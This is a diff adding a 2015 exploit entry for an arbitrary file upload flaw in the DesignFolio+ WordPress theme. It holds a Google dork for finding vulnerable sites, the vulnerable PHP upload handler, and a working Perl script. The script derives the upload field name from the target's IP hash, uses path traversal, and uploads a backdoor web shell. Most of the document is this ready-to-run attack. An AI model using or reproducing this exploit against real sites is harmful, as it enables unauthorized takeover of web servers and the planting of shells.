@@ -1,0 +1,66 @@
+#########################################################
+# Exploit Title: Wordpress Theme DesignFolio+ Arbitrary File Upload Vulnerability
+# Google dork: inurl:wp-content/themes/DesignFolio-Plus
+# Author: CrashBandicot
+# Date: 04.03.2015
+# Vendor HomePage: https://github.com/UpThemes/DesignFolio-Plus
+# Software Link: https://github.com/UpThemes/DesignFolio-Plus/archive/master.zip
+# tested on : MsWin32
+#########################################################
+ 
+Vulnerable File : upload-file.php
+<?php
+//Upload Security
+$upload_security = md5($_SERVER['SERVER_ADDR']);
+$uploaddir = base64_decode( $_REQUEST['upload_path'] ) . "/";
+if( $_FILES[$upload_security] ):
+        $file = $_FILES[$upload_security];
+        $file = $uploaddir . strtolower(str_replace('__', '_', str_replace('#', '_', str_replace(' ', '_', basename($file['name'])))));
+          
+                if (move_uploaded_file( $_FILES[$upload_security]['tmp_name'], $file)):
+                        if(chmod($file,0777)):
+                            echo "success"; 
+                        else:
+                                echo "error".$_FILES[$upload_security]['tmp_name'];
+                        endif;
+                else:
+                    echo "error".$_FILES[$upload_security]['tmp_name'];
+                endif;
+endif;
+?>
+ 
+Exploit
+ 
+#!/usr/bin/perl
+ 
+use Digest::MD5 qw(md5 md5_hex);
+use MIME::Base64;
+use IO::Socket;
+use LWP::UserAgent;
+ 
+    system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+        print "\n\t     ! *** #  ^_^ # *** !\n\t      :p\n\n";
+ 
+$use = "\n\t  [!] ./$0 127.0.0.1 backdoor.php";
+ 
+($target ,$file) = @ARGV;
+ 
+die "$use" unless $ARGV[0] && $ARGV[1];
+ 
+if($target =~ /http:\/\/(.*)\//){ $target = $1; }
+elsif($target =~ /http:\/\/(.*)/){ $target = $1; }
+elsif($target =~ /https:\/\/(.*)\//){ $target = $1; }
+elsif($target =~ /https:\/\/(.*)/){ $target = $1; }
+ 
+my $addr = inet_ntoa((gethostbyname($target))[4]);
+my $digest = md5_hex($addr);
+my $dir = encode_base64('../../../../');
+ 
+my $ua = LWP::UserAgent->new( agent => q{Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36},);
+$pst = $ua->post("http://".$target."/wp-content/themes/designfolio-plus/admin/upload-file.php", Content_Type => 'form-data', Content => [ $digest => [$file] , upload_path => $dir ]);
+if($pst->is_success) { print "[+] Backdoor Uploaded !"; } else { print "\n [-] Bad Response Header :/ FAIL"; }
+ 
+__END__
+ 
+ 
+# File path: http://target/shell.php
